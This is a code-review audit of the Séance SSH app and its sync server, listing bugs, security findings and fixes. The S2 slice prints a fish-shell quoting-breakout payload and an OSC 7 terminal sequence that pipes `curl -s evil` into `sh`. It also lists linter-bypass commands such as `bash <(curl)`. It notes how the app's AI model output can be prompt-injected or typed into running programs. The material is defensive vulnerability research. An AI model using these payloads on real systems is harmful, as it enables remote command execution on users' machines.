- **Severity** P2 · **Category** stability/data-safety · **Status** KNOWN (SOL-051 "orphans", "live-account token joins") + new concrete repro · **Confidence** VERIFIED (repro)
- **Location**
  - `sqlite_storage.dart:104-110`: `deleteAccount` runs four autocommit
    statements with no transaction.
  - `:127-151`: `pushRecords` never checks that the account exists.
  - `:277-286`: `_nextSeq`'s upsert re-creates the `seqs` row.
  - `:100`: `createAccount` uses `INSERT OR IGNORE INTO seqs`, which keeps
    a stale value.
  - `:120-125`: `usernameForToken` does not join `accounts`.
  - The window is real: `_withAuth` resolves the token, then `_push`
    awaits the body stream (`server.dart:191-193`) before writing.
- **Evidence** Probe output: `push after delete: accepted=true latest=1`,
  then after `createAccount` for the same name,
  `new account sees [orphan] latestSeq=1`.
- **Failure scenario** A device's in-flight push lands just after "delete
  account". When the user re-registers the same name (new salt, new vault
  key), every device pulls ciphertext it cannot open. The enrolment check
  (S1-05) may then reject the correct passphrase because the first record
  is an orphan. A crash between the four deletes can also leave live
  tokens for a deleted account.
- **Fix**
  - Wrap `deleteAccount` in `_transaction(write)`.
  - In `pushRecords`' write transaction, first run
    `SELECT 1 FROM accounts WHERE username=?`. If it is absent, throw
    `AccountGoneException` and map it to 401.
  - Change `usernameForToken` to
    `SELECT t.username FROM tokens t JOIN accounts a USING(username) WHERE t.token=?`.
  - Have `createAccount` run in one transaction that deletes leftover
    `records/seqs/tokens` rows for the name, and create the token in that
    same transaction.
  - Mirror all of this in `InMemoryStorage`.
  - Tests: the probe above expects the push to be refused and the new
    account to start empty; a token for a deleted account returns 401.
- **Effort** S/M

#### S1-08: Snippet edits are stamped with raw `now` and get reverted under clock skew
- **Severity** P2 · **Category** bug (silent data loss) · **Status** NEW · **Confidence** VERIFIED (code trace)
- **Location**
  - `app/seance_app/lib/ui/snippets_pane.dart:377-387`:
    `existing.copyWith(..., updatedAt: now)`.
  - `app_state.dart:1434-1459`: `saveSnippet` does not clamp.
  - Contrast `ui/server_editor.dart:158-159` (`nextUpdatedAt` =
    `max(now, existing+1)`), `SecretVault.putLocalSecret`
    (`stores.dart:188-203`) and `_deletionStamp` (`app_state.dart:923`).
- **Evidence** The revert path:
  1. A peer whose clock runs ahead saved the snippet at T1.
  2. This device adopted it, then the user edits it at `now < T1`.
  3. On the next run the full pull compares local `(now, me)` with remote
     `(T1, peer)`. Remote wins (`sync_engine.dart:83-87`).
  4. `applyToStores` calls `putSnippet(remote)` unconditionally
     (`sync_coordinator.dart:671`), so the edit is gone without a message.
- **Failure scenario** A device with a clock minutes ahead (common on
  VMs, dual-boot machines and phones with manual time) edits a snippet.
  Another device edits the same snippet shortly afterwards, and that edit
  silently disappears on the next auto-sync.
- **Fix**
  - Use `nextUpdatedAt(existing.updatedAt, now: now)` in `_save`. Better,
    clamp centrally in `AppState.saveSnippet` (read the existing snippet
    and set `updatedAt = max(snippet.updatedAt, existing.updatedAt + 1)`)
    so every caller benefits.
  - Consider the same clamp for `ssh_session.dart:125`
    (`pinnedAt: DateTime.now()` on re-pin). There a loss re-applies the
    old pin, which then blocks with a changed-key prompt: fail-safe but
    confusing.
  - Test: save an edit to a snippet whose `updatedAt` is `now + 60 000`;
    the stored stamp is greater than the old one.
- **Effort** S

#### S1-09: Storage failure leaves the process up and `/healthz` at 200
- **Severity** P2 · **Category** stability · **Status** KNOWN (SOL-052 `/readyz`) + concrete small fix · **Confidence** VERIFIED (code)
- **Location**
  - `sqlite_storage.dart:197-222`: `_rollback` sets `_failure` for good.
  - `server.dart:36`: `/healthz` never consults storage.
  - `server.dart:286-288`: every request becomes 503.
  - `docker-compose.yml`: the healthcheck probes `/healthz`, with
    `restart: unless-stopped`.
- **Failure scenario** One uncertain rollback (for example a disk-full
  error during COMMIT followed by a failed ROLLBACK) disables storage.
  From then on every sync returns 503 "restart required", yet Docker
  reports the container healthy and never restarts it, until a human
  notices.
- **Fix** Two options, smallest first:
  - (a) Give `Storage` an `isAvailable` getter; `/healthz` returns 503
    when it is false.
  - (b) After mapping `StorageUnavailableException` to 503, schedule
    `exit(70)` in the bin entrypoint through a callback in `SyncServer`,
    so the restart policy reopens the database.
  - Test: force `_failure` and assert `/healthz` returns 503.
- **Effort** S

#### S1-10: Full pull every run under a 30 s whole-response timeout
- **Severity** P2 · **Category** performance · **Status** KNOWN (SOL-001 "rebuilds mirror from sequence zero", SOL-050 pagination) + new quantification · **Confidence** LIKELY
- **Location**
  - `app_services.dart:560`: a fresh `InMemoryLocalRecordStore` per run.
  - `http_sync_client.dart:157-163`: `.timeout(30 s)` covers the whole
    body download.
  - `sqlite_storage.dart:153-161`: materializes every blob.
  - `app_state.dart:463`: runs every 5 min, plus after edits.
- **Evidence and arithmetic** A config with a 192 KiB image seals to
  ~258 KiB, about 344 KiB as base64 on the wire. 100 such servers make a
  ~34 MB pull every run, around 400 MB/hour while the app is open. Below
  roughly 9 Mbit/s the pull cannot finish in 30 s, so sync fails every
  time. The server also holds about 4x the account size per concurrent
  pull (rows, base64 copies, JSON string, encoded bytes).
- **Fix** The real fix is SOL-001 slice 1: persist the mirror and cursor.
  Poltergeist's `PersistentLocalRecordStore` is a working reference and
  could be upstreamed into `seance_core`, together with S1-03. Interim:
  apply the timeout per chunk (idle timeout) instead of per whole
  response, e.g. `client.send` plus a stream `timeout` between chunks.
- **Effort** L (real fix) / S (interim)

#### S1-11: Salt and verifier lengths unchecked on both sides
- **Severity** P2 · **Category** security · **Status** KNOWN (SOL-014 "validate salt/verifier encoding and exact lengths at both boundaries") · **Confidence** VERIFIED
- **Location**
  - `server.dart:101-114`: any base64 is accepted, including empty; the
    `argonSalt` string is stored unparsed.
  - `app_services.dart:474-480`: `base64.decode(pre.argonSalt)` with no
    length check.
- **Evidence** A register with `authVerifier:''` and `argonSalt:''`
  returns 200 plus a token.
- **Failure scenario** A malicious server can hand out one fixed or empty
  salt to every user. That lets it amortize a single dictionary attack
  across all accounts, which per-account salts exist to prevent. A buggy
  client can also create an account whose empty verifier anyone can log
  in with.
- **Fix** Require the salt to decode to exactly 16 bytes and the verifier
  to exactly 32 bytes on the server (400), and require the salt to be at
  least 16 bytes on the client at prelogin (refuse). Fold this into the
  S1-06 validation PR.
- **Effort** S

#### S1-12: Idle sync reports "pulled N" and always spends 2 rounds
- **Severity** P3 · **Category** UX/performance · **Status** NEW · **Confidence** VERIFIED (repro)
- **Location** `sync_engine.dart:83-87` counts `applied++` when the
  remote copy of *this device's own* record wins the tie on seq. The count
  surfaces in `settings_screen.dart:1352` as "Synced: pulled N, pushed M".
- **Evidence** `s1_counts_probe_test.dart`: run 0 gives
  `pulled=0 pushed=5 rounds=1`; runs 1 and 2 each give
  `pulled=5 pushed=0 rounds=2`, with 2 pulls per idle run.
- **Fix** In `_pullOnce`, when `remote.updatedAt == local.updatedAt &&
  remote.deviceId == local.deviceId`, still call `putRemote` (to clear
  dirty and adopt the seq) but do not count it as applied. An idle run
  then converges in one round and reports `pulled 0`. Update the loop's
  break condition test.
- **Effort** S

#### S1-13: Client-supplied `seq` decides exact LWW ties on the server
- **Severity** P3 · **Category** bug · **Status** KNOWN (SOL-013) · **Confidence** VERIFIED (repro)
- **Location** `lww.dart:23-26`, `storage.dart:136-137`,
  `sqlite_storage.dart:138-139`; `EncryptedRecord.fromJson` reads `seq`
  from the push body.
- **Evidence** A second push with the same `(updatedAt, deviceId)`, a
  different blob and `seq: 1<<40` is accepted, and the pull then returns
  the `evil` blob.
- **Fix** In `_push`, rebuild each incoming record with `seq: null`
  before calling storage. Include it in the validation PR, with a
  one-line test.
- **Effort** S

#### S1-14: Compose hard-codes `SEANCE_OPEN_REGISTRATION: "false"`
- **Severity** P3 · **Category** UX/ops · **Status** NEW · **Confidence** VERIFIED
- **Location** `packages/seance_sync_server/docker-compose.yml:27`
  (similarly the limiter variables); `.env.example` offers only
  `SEANCE_PUBLISH_ADDR`.
- **Failure scenario** The compose `.env` file only feeds `${…}`
  interpolation, so it cannot override a literal. To enrol, operators edit
  the tracked compose file, which then collides with `./update.sh`'s
  `git pull --ff-only` whenever upstream touches it. The docs say "flip it
  only long enough", yet flipping means a local diff.
- **Fix** Use `SEANCE_OPEN_REGISTRATION: "${SEANCE_OPEN_REGISTRATION:-false}"`
  (and the same pattern for the login-limit and cap variables), and
  document them in `.env.example`.
- **Effort** S

#### S1-15: `prelogin` with a non-string username returns 500
- **Severity** P3 · **Category** bug · **Status** KNOWN (SOL-049) · **Confidence** VERIFIED
- **Location** `server.dart:122` (`body?['username'] as String?` throws
  `TypeError`, which the middleware maps to 500).
- **Evidence** Probe: `prelogin int username -> 500`.
- **Fix** Type-check and return 400, as part of S1-06.
- **Effort** S

### 3. Best PR candidates

1. **Bound unauthenticated input (S1-01, S1-06, S1-11, S1-13, S1-15).**
   About 250 lines including tests, entirely server-side plus a shared
   validator.
   - Write the tests first in `server_test.dart`:
     - a 17 KiB `/v1/login` body returns 413;
     - register with `""`, a NUL name or a 65-char name returns 400
       `bad_username`;
     - `prelogin {"username":5}` returns 400;
     - register with a 15-byte salt or 31-byte verifier returns 400;
     - a forged-`seq` tie push is rejected.
   - Then implement:
     - `BytesBuilder` in `_readBounded`;
     - a `maxBytes` parameter on `_readJson`, with 16 KiB for auth routes;
     - `validateUsername` in `seance_protocol`, used by the server and by
       `HttpSyncClient`/enrolment;
     - limiter keys hashed with SHA-256;
     - salt and verifier length checks (server, plus the client-side salt
       check in `loginSync`);
     - `seq: null` normalization in `_push`.
   - Keep `tool/mem_probe.dart` as a manual benchmark note in the PR.

2. **Apply pulled records even when one record is refused (S1-04).**
   About 120 lines.
   - Write first: the `s1_oversize_probe_test.dart` scenario as a
     `sync_coordinator_test.dart` or `integration_test.dart` case (a real
     server with a 64 KiB `maxBlobBytes`), expecting B to show
     `alpha-renamed` and `outcome.refused == ['snippet:big']`.
   - Then:
     - `_pushOnce` catches `ApiError(code: 'payload_too_large')` for
       single-record batches only and records the refused id;
     - `SyncOutcome` gains `refused`;
     - `run()` always reaches `applyToStores` and prunes tombstones,
       then surfaces the refused ids;
     - the settings message names the record.
   - Keep the existing test that a multi-record 413 still throws.

3. **Signal and recover from cursor regression (S1-03).** About 150 lines.
   - Write first:
     - server: `GET /v1/sync?since=10` on an account at seq 3 returns 409
       `cursor_ahead`;
     - engine: an `InMemoryLocalRecordStore` at cursor 5 against a
       FakeServer at `latestSeq` 3 re-pulls from 0 and delivers new
       records;
     - integration: delete, re-register and push, and a persistent-cursor
       client still receives the new records.
   - Then: add the server check, move `SyncCursorRejectedException` into
     `seance_core` with the 409 mapping in `HttpSyncClient.pull`, and add
     `LocalRecordStore.resetHighWaterSeq` plus the engine fallback.
   - Coordinate with Poltergeist: switch its import to the core type. Its
     catch path starts working unchanged.

4. **Transactional account lifecycle (S1-07).** About 150 lines.
   - Write first (in `storage_batch_test.dart`, both backends): a token
     resolved, the account deleted, then a push throws
     `AccountGoneException` (HTTP 401); re-registering the name yields
     empty records and seq 0; a token of a deleted account returns 401.
   - Then: wrap `deleteAccount` and `createAccount`+token in
     `_transaction(write)`, check account existence inside
     `pushRecords`' transaction, join accounts in `usernameForToken`, and
     clear leftovers in `createAccount`.

5. **Encryption-passphrase key-check canary (S1-05).** About 120 lines,
   app services plus core helper.
   - Write first (app-service tests with the fake sync server from
     existing tests): empty account, second device, wrong passphrase:
     refused; correct passphrase with a canary present: accepted; mixed
     account: specific error.
   - Then:
     - a `KeyCheck` helper in `seance_core` (`id = 'keycheck:v1'`, sealed
       `{kind:'keyCheck', data:{}}`), which decodes as
       `RecordKind.unknown` everywhere, so no enum change and no
       Poltergeist switch breakage;
     - `registerSync` pushes it;
     - `loginSync` checks it first, and pushes it if the account has
       none.

6. **Monotonic snippet stamps (S1-08).** About 40 lines.
   - Test first: `AppState.saveSnippet` (or a pure helper, like
     `nextUpdatedAt`, extracted for testability) given `existing.updatedAt
     = now + 60 000` stores `existing + 1`.
   - Then clamp centrally in `saveSnippet`.

S1-02 (stamp binding) is high value but needs the ordered Poltergeist
change first. It should be the next PR after the cross-repo
`keepLocalPin` fix lands.

### 4. Ideas

- **"Who changed this?" sync receipts.** The envelope already carries
  `deviceId` and `updatedAt` for every record. Keep a device-name map (a
  sealed `device:<id>` record with a friendly name). The server list can
  then show "edited on MacBook, 3 min ago", and the sync sheet "Pulled 2
  changes from Pixel". First slice: a sealed device-name record published
  once, plus a tooltip on the server row. It also gives the SOL-048
  device-revocation UI its list.
- **Echo-free cursor advance.** A push response whose accepted seqs are
  exactly `previousLatest+1..latestSeq` proves no other device wrote in
  between. The client can advance its cursor to `latestSeq` and skip
  re-downloading its own pushes, which matters most for image marks.
  First slice: implement it in `SyncEngine._pushOnce` behind the
  persistent store (Poltergeist first), with a test for the non-contiguous
  case.
- **Rollback tripwire.** Each client remembers the highest `latestSeq`
  it has seen per account, plus a rolling hash of the (id, updatedAt,
  deviceId) tuples it pulled. A later pull with a lower `latestSeq`, or
  a tuple older than one already seen for the same id, raises a "server
  state went backwards" notice instead of silently adopting it. First
  slice: the `latestSeq` regression check from S1-03, logged as a warning
  rather than only triggering a reset.
- **Non-enumerating prelogin.** For unknown usernames, return a
  deterministic fake salt (`HMAC(serverSecret, username)`) and default
  params instead of 404, as Bitwarden does. First slice: a server-secret
  environment variable (auto-generated into `/data` on first boot) and
  one handler change, with a test that unknown and known users are
  indistinguishable by status and shape.
- **Account doctor endpoint.** An authenticated `GET /v1/account/stats`
  returning record count, total blob bytes, largest record id and size,
  and the tombstone count. The app shows "Your sync account: 142 records,
  3.4 MB; largest: server 'prod-db' (258 KiB)". That directly helps users
  hit by S1-04 or S1-10. First slice: a SQLite `SUM(LENGTH(blob))` query
  and a Settings line.

---

## S2 review: `seance_core` outside sync (SSH, SFTP, git, TOFU, probe, ssh_config, terminal seam, stores, update, LLM)

Reviewed at Séance `dd7e105` (main), read-only. dartssh2 3.0.2 and http 1.6.0 sources were read from the pub cache.
Verification tools I used: a scratch copy of `remote_git.dart`, `shell_command.dart`, `ssh_config_import.dart`,
`redaction.dart` and `danger_linter.dart` under Dart 3.13.2; real `git` 2.43; and fish 3.7.0, extracted from the Ubuntu .deb
without installing it. Scratch dir: `scratchpad/work-S2/`.

Severity scale: **P0** means an exploitable break of a security boundary, or data loss, in a common configuration. **P1** is the
same with narrower preconditions, or a serious integrity issue. **P2** is a real bug, security weakness or performance issue.
**P3** is hardening or polish.

### 1. Summary

The code is careful and well commented. The ProxyJump/agent work does what STATUS claims: every hop is TOFU-verified against its own
`host:port`, agent frames are bounded, and chain cleanup is owned. Reading and upload CAS are also solid. The main risks are at the
edges, where assumptions stop holding:

1. **Shell quoting assumes POSIX, but the remote login shell may be fish.** In fish, `'\'` escapes the quote. A crafted directory
   name can therefore break out of the quotes. That name can also arrive as an OSC 7 path in ordinary terminal output, which the Git
   tab probes automatically. Result: arbitrary remote command execution, with no user action. Verified in fish 3.7 (S2-01). The same
   probe also runs a repository's `core.fsmonitor` command (S2-05).
2. **Atomic upload is careless with what it replaces.** Replacing a symlink produces a mode-0777 regular file (S2-02). The staged
   bytes of a 0600 file sit world-readable during the upload, and uid/gid are dropped (S2-09).
3. **"Paste but never run" is only true at a shell prompt.** Assistant and generator output is injected raw. In vim normal mode,
   `ggdGZZ` wipes and saves a file without any Enter (S2-03). The static `CONTEXT>>>` delimiters make prompt injection easy (S2-12).
4. **Liveness and deadlines.** Keepalives never detect a dead peer (S2-08). Channel open and exec have no deadline, and dartssh2 never
   fails a pending channel request (S2-07). The cancellation wrapper leaks one listener per 16 KiB chunk, about 500 MB per million
   chunks in JIT (S2-06). That code is shared by Poltergeist's bulk transfers.
5. **Correctness.** The git pane loses branch, upstream, ahead/behind and stash on every git ≥ 2.17. The test fixtures use
   LF-terminated headers that real `-z` output does not have (S2-04). ssh_config `Key = value` imports `= host` as the hostname
   (S2-10).

### 2. Findings

| ID | Title | Sev | Category | Status | Confidence |
|---|---|---|---|---|---|
| S2-01 | POSIX quoting is not fish-safe, so terminal output can inject commands into git probe exec and the staged `cd` | P1 | security | NEW | VERIFIED |
| S2-02 | Upload "Replace" over a symlink replaces the link with a mode-0777 regular file | P1 | security / data-safety | NEW | VERIFIED (code), LIKELY (server masking) |
| S2-03 | `paste_to_prompt` and the command generator inject raw keystrokes into any foreground program | P1 | security | KNOWN(SOL-047) partly; TUI angle NEW | VERIFIED (code) |
| S2-04 | Git porcelain v2 `-z` headers are NUL-terminated, so branch, upstream, ahead/behind and stash are dropped | P2 | bug | NEW | VERIFIED (real git 2.43) |
| S2-05 | Background git probe runs repo-configured `core.fsmonitor` and takes optional index locks | P2 | security | NEW | VERIFIED |
| S2-06 | `_cancelWhenRequested` adds a listener per chunk to a never-completing future | P2 | stability / performance | NEW | VERIFIED (benchmark) |
| S2-07 | Exec, shell and channel-open requests have no deadline, and dartssh2 never fails them on transport close | P2 | stability | NEW (SOL-020 covers the area generally) | VERIFIED (code) |
| S2-08 | Keepalive cannot detect a dead peer: one unanswered ping stops keepalives for good | P2 | stability | NEW | VERIFIED (code) |
| S2-09 | Upload temp file is world-readable while staging, and replace drops uid/gid | P2 | security / data-safety | NEW | VERIFIED (code), LIKELY (umask) |
| S2-10 | ssh_config `Key = value` form imports `= value`, and `%h` is not expanded | P2 | bug | NEW (SOL-022 lists other parser gaps) | VERIFIED (run) |
| S2-11 | Redaction misses JSON keys, `*_SECRET_KEY`, URL credentials, `-pPASS`, Basic auth and partial PEM | P2 | security | Partly KNOWN(SOL-045) | VERIFIED (run) |
| S2-12 | Untrusted-context delimiters are static and spoofable | P2 | security | NEW | VERIFIED (code), LIKELY (model effect) |
| S2-13 | Danger-linter bypasses (`bash <(curl)`, `sh -c "$(curl)"`, `\| sudo -E bash`, quoted targets, `/dev/xvda`, …) | P2 | security | NEW | VERIFIED (run) |
| S2-14 | TOFU pins keyed by bare `host:port` collide across jump routes | P2 | security / UX | NEW | VERIFIED (code) |
| S2-15 | Upload throughput capped at one local chunk per round trip | P2 | performance | NEW | VERIFIED (code), LIKELY (magnitude) |
| S2-16 | Agent auth: default everywhere (mobile has no agent; macOS sandbox), no key selection (MaxAuthTries) | P2 | cross-platform / missing-feature | Partly KNOWN(SOL-028) | LIKELY |
| S2-17 | Host-key algorithm preference ignores the pinned key type, raising false "HOST KEY CHANGED" | P3 | security / UX | NEW | LIKELY |
| S2-18 | Probe service TCP-probes jump-routed servers directly | P3 | bug / privacy | NEW (SOL-024 is other probe issues) | VERIFIED (code) |
| S2-19 | SFTP listing does not validate server-supplied names (`/`, `..`, NUL) | P3 | security (hardening) | NEW | VERIFIED (code) |
| S2-20 | `SecretVault.getSecret(id)` does not check the decrypted secret's id | P3 | security (hardening) | NEW | VERIFIED (code) |
| S2-21 | A dead SFTP subsystem is cached for the session's life; `openRemoteFileSystem` throws synchronously | P3 | stability | NEW | LIKELY |
| S2-22 | Default dartssh2 algorithms include dh-group1-sha1, hmac-md5, ssh-rsa/SHA-1 and CBC; no strict-KEX | P3 | security | KNOWN(SOL-028) | VERIFIED (code) |

---

#### S2-01: POSIX quoting is not fish-safe, so terminal output can inject commands into git probe exec and the staged `cd`
- **Severity** P1 (critical for fish users) · security · NEW · **VERIFIED**
- **Location**
  - `packages/seance_core/lib/src/ssh/remote_git.dart:583` (`_quotePosix`), `:262-269` (`_cdPrefix`), `:208-215` (`run`), `:253-256`
  - `packages/seance_core/lib/src/terminal/shell_command.dart:38-49` ("Adjacent single/double-quoted segments are accepted by fish
    as well as POSIX shells")
  - Trigger path: `app/seance_app/lib/services/xterm_engine.dart:166-186` (OSC 7 is percent-decoded straight into
    `workingDirectory`) → `app/seance_app/lib/services/remote_git_controller.dart:59-76,90-118,120-125` (auto-`refresh()` on every
    reported directory change).
- **Evidence.** In fish, `\'` and `\\` are escapes inside single quotes. `_quotePosix` produces `'…'"'"'…'`. A path containing `\'`
  turns the POSIX close-quote into a literal quote and flips the quoting parity. This is the exact probe command produced for
  directory `/tmp/x\'";touch PWNED;#`:
  ```
  export LC_ALL=C; cd -- '/tmp/x\'"'"'";touch …/PWNED;#' && git rev-parse …
  ```
  Results: `sh -c` → PWNED not created. `fish -c` (3.7.0) → **PWNED created**. The staged `cd` from
  `buildChangeDirectoryCommand(..., shell: fish)` behaves the same way.
- **Failure scenario.** The user's login shell is fish, and the Git tab has been opened once in the session. The user runs `cat`
  on an attacker's file, tails a log, or views a commit message. The output contains
  `ESC]7;file://h/tmp/x%5C'%22;curl%20-s%20evil|sh;%23 BEL`. `RemoteGitController` sees a new absolute directory and calls
  `RemoteGit.probe`. sshd runs `fish -c "<probe>"`, and the payload executes as the user with nothing shown on screen. The
  "cd here" action has the same bug with a crafted directory name; that path needs the user to press Enter on a line that looks like
  a quoted `cd`. `export … ; { …; }` would be a syntax error on fish < 4, but the injected `#` comments out the rest of the line, so
  it parses on every fish version.
- **Fix**
  1. Add a dialect-neutral quoter to core, for example `quoteShellWord(String)` in `terminal/shell_command.dart`, and use it in both
     files. Emit single-quoted runs. Emit each `'` as `"'"` and each `\` as `"\\"`, keeping them outside the single quotes. I checked
     this encoding with sh, bash and fish 3.7 on `\'";…;#`, `a\\b`, `it's`, `\`, `$(…)` and backticks: all round-trip byte-exact, and
     nothing executes.
  2. Stop parsing the probe with the login shell. Run `client.execute('sh -s')` and write the script to stdin. The login shell then
     only parses `sh -s`. This also fixes fish < 4 (`{ }`), csh, and a non-POSIX `$SHELL`. Keep the new quoter anyway for
     `buildChangeDirectoryCommand`, which is typed into the interactive shell.
  3. In `RemoteGitController`, ignore OSC 7 or title directories that contain control characters.
- **Test first.** Table tests in `remote_git_test.dart` and `shell_command_test.dart` that pin the exact output for `\'`, `\\` and
  `'`. Plus an integration test that runs `quoteShellWord(x)` through `sh -c 'printf %s …'`, and through `fish -c`, skipped when fish
  is absent, and asserts round-trip equality with no side-effect file.
- **Effort** S (quoter), M (with `sh -s`).

#### S2-02: Upload "Replace" over a symlink replaces the link with a mode-0777 regular file
- **Severity** P1 · security / data-safety · NEW · **VERIFIED** in code; the server-side mask is standard OpenSSH behavior
  (**LIKELY** on other servers).
- **Location** `packages/seance_core/lib/src/ssh/remote_file_system.dart:492` (`existing = _statOrNull(path)`, an lstat),
  `:564-569`, `:598`. Callers: `app/seance_app/lib/ui/files_pane.dart:498-520` ("Replace name?" → `overwrite: true`);
  `app/seance_app/lib/services/remote_files_controller.dart:518-540` (folder upload with `expectedTarget: existing`); Poltergeist's
  transfer queue and executor.
- **Evidence.** `existing` is lstat data, so for a symlink `mode` is `0o120777`. Nothing rejects `type == symbolicLink`. Then
  `final mode = preserveMode ?? existing?.mode;` is applied with
  `setStat(tempPath, SftpFileAttrs(mode: SftpFileMode.value(mode)))`. dartssh2 writes the full value, and OpenSSH sftp-server does
  `chmod(name, perm & 07777)`, so the temp file becomes 0777. `rename` (posix-rename) then replaces the link itself. The CAS check
  (`_sameSnapshot`) passes, because the snapshot is also the link's.
- **Failure scenario.** As root, you drag a new `default` into `/etc/nginx/sites-enabled/`, where `default` is a symlink into
  `sites-available`, and confirm "Replace". The result is a regular file with mode `rwxrwxrwx`: any local user can rewrite the nginx
  config. The real file in `sites-available` stays stale, and the stow/dotfiles-style link is gone. Type bits are also sent for
  regular files (`0100644`); servers that don't mask them may reject them.
- **Fix** In `upload()`:
  1. If `existing?.type` is `symbolicLink` or `other`, throw `RemoteFileException(kind: conflict, message: '"x" is a symbolic link;
     replacing it would replace the link, not its target.')`. Optionally add an explicit `SymlinkPolicy { refuse, writeThrough,
     replaceLink }` enum parameter. `writeThrough` would `canonicalize` and stage beside the resolved target.
  2. Never derive `mode` from a non-regular `existing`.
  3. Mask with `& 0xFFF` before `setStat`.
- **Test first.** In `remote_file_system_upload_cas_test.dart`, teach `_PathAwareSftpClient` to hold a symlink entry (lstat type
  `symbolicLink`, mode `0xA1FF`). Assert that `upload(overwrite: true)` throws a conflict, performs no rename, and removes the temp
  file. Assert that a regular-file replace calls `setStat` with `mode & 0xFFF`.
- **Effort** S–M.

#### S2-03: `paste_to_prompt` and the command generator inject raw keystrokes into any foreground program
- **Severity** P1 · security · KNOWN(SOL-047: "explicit handling of a nonempty prompt… Do not silently concatenate") for the prompt
  and concatenation part; the full-screen-program execution angle is NEW · **VERIFIED** (code)
- **Location**
  - `packages/seance_core/lib/src/llm/chat_controller.dart:80-83` (`PasteStager` contract: "never executed here"), `:227-234`
    (every `paste_to_prompt` call is staged, several per turn)
  - `packages/seance_core/lib/src/terminal/paste_sanitizer.dart:79-105`
  - App sinks: `app/seance_app/lib/ui/chat_sidebar.dart:77-85` and `app/seance_app/lib/ui/command

> **Note:** the S2 report stops here; the slice was cut off mid-entry. Entries S2-04..S2-22 exist only as the table rows above, plus the summary. Re-verify their evidence before implementing.

---

## S3 — Séance app non-visual logic (app_state, main, services/*)

Reviewer slice: `app/seance_app/lib/app_state.dart`, `main.dart`, `app/seance_app/lib/services/*`.
Base: working tree at `/home/user/Seance` (HEAD `dd7e105`), read-only. Date 2026-09-26.
Repros ran in `scratchpad/work-S3/repro` (copies of the store files + a copy of `seance_core`), Dart 3.13.2.

### 1. Summary

The service layer is unusually careful: the mutation queue, vault re-key journal, assistant-sync
guards, and settings-window link are well reasoned and well tested. The weak spots are the
**failure and recovery paths around local persistence and credentials**. Several of them turn a
rare I/O or keystore error into permanent loss, or into a sync account other devices can no longer
join.

Biggest risks:
- **Managed-edit checkouts are deleted on the second launch after the index is quarantined, or on any
  launch where the index is missing.** The code promises to preserve them for recovery, but the
  protection lasts only one launch. Reproduced (S3-01).
- **A failed sync enrolment still leaves sync "configured".** The server URL is saved and the token
  stored, but the vault stays on the device-local key. The next auto-sync pushes records sealed with
  that key, which can lock other devices, including this one on retry, out of the account (S3-02).
- **One checkout that cannot be deleted or read makes `AppState.load()` throw.** The app then shows
  "Failed to start Séance" and offers no in-app recovery. Reproduced (S3-03).
- **SOL-031 has concrete platform triggers.** On Android, Auto Backup is left on and
  `flutter_secure_storage` 10's `resetOnError` defaults to true. On Windows, the DPAPI plugin deletes
  its store when decryption fails, and returns `{}` when a read fails. In each case the store looks
  empty, and `probeKeystore` then mints a new master key over an existing vault (S3-04).
- **Desktop focus loss is treated as backgrounding.** Every return to the window triggers an
  immediate probe sweep of every server and re-hashes every managed checkout twice (S3-05).
- **Lifecycle holes:** closing a tab is not exception-safe, and can leak the SSH session (S3-06).
  There is no quit guard, so quitting silently drops dirty built-in-editor buffers (S3-07).

Test gaps: none of the tests exercise the second launch after a quarantine, a partial enrolment
failure followed by a sync round, `setForeground`/lifecycle, `closeTab` when deleting a local copy
fails, CommandStats eviction, a concurrent first load of the JSON stores, or app-exit handling.

### 2. Findings

| ID | Title | Sev | Category | NEW/KNOWN | Confidence | Effort |
|---|---|---|---|---|---|---|
| S3-01 | Quarantined/missing managed index → startup sweep deletes unsaved local edits | P1 | stability/data-safety | NEW | VERIFIED (repro) | S–M |
| S3-02 | Failed enrolment persists URL+token; later rounds push with device-local key (account poisoning); no key-match guard | P1 | bug/data-safety | KNOWN (SOL-030 residual) + NEW consequence | VERIFIED (trace) | M |
| S3-03 | One unreadable/undeletable checkout aborts `AppState.load()` → app cannot start | P2 | stability | NEW | VERIFIED (repro, sweep path) | S |
| S3-04 | Android backup/`resetOnError` and Windows DPAPI plugin behaviour feed SOL-031 minting → existing vault orphaned | P1 | cross-platform/data-safety | KNOWN (SOL-031) + NEW triggers | LIKELY | S–M |
| S3-05 | Desktop/Android `inactive` pauses probes; every refocus = immediate full probe sweep + 2× checkout re-hash | P2 | performance/cross-platform | NEW | VERIFIED (trace + Flutter docs) | S |
| S3-06 | `closeTab` teardown not exception-safe → leaked SSH session, stale keep-alive, no notify | P2 | stability | NEW | VERIFIED (trace), LIKELY trigger on Windows | S |
| S3-07 | No quit guard: dirty built-in editor buffers / live sessions dropped silently on quit | P2 | missing-feature/data-safety | NEW | VERIFIED | S–M |
| S3-08 | Persistence failure paths: Windows delete-then-rename, I/O errors quarantined as corrupt, `.corrupt` overwritten, silent vault reset | P2 | stability/data-safety | KNOWN (SOL-034) + NEW specifics | VERIFIED (reading) | M |
| S3-09 | Two desktop instances clobber each other's stores (Linux `G_APPLICATION_NON_UNIQUE`, no Windows mutex) | P2 | data-safety | KNOWN (SOL-034) | VERIFIED | S |
| S3-10 | CommandStats: once 400 commands have count ≥ 2, no new command can ever be learned | P3 | bug | NEW | VERIFIED (repro) | S |
| S3-11 | Renaming onto a path with a retained local copy orphans it; `update()` lacks `put()`'s uniqueness check | P3 | bug | NEW | VERIFIED (trace) | S |
| S3-12 | Managed checkouts whose server is gone are never surfaced or cleaned (hidden plaintext + hidden edits) | P3 | data-safety/privacy | NEW (ANALYSIS asks to expose retained plaintext) | VERIFIED | M |
| S3-13 | JSON stores: `_loaded` set after awaits (first-load race); failed flush leaves cache mutated | P3 | data-safety | KNOWN-ish (SOL-034) | SPECULATIVE (race) / VERIFIED (rollback) | S |
| S3-14 | Vault locked by a failed re-key settle: no toast, and errors blame the keyring | P3 | UX | NEW | VERIFIED | S |
| S3-15 | Settings window closed before `hello` → host thinks it is visible; next open reuses stale page | P3 | bug | NEW | SPECULATIVE | S |
| S3-16 | Auto-sync queued during a manual sync is dropped; overlapping rounds clear `syncing` early | P3 | bug | NEW | VERIFIED | S |
| S3-17 | Transfer progress calls `notifyListeners` per SFTP chunk | P3 | performance | NEW | VERIFIED | S |
| S3-18 | Windows app data (incl. plaintext checkouts) lives in Roaming AppData; Linux stores use umask mode | P3 | cross-platform/privacy | NEW | VERIFIED | S |

#### S3-01 — Quarantined or missing managed index → startup sweep deletes unsaved local edits
- **Severity** P1 · **Category** stability/data-safety · **NEW** · **VERIFIED (reproduced)**
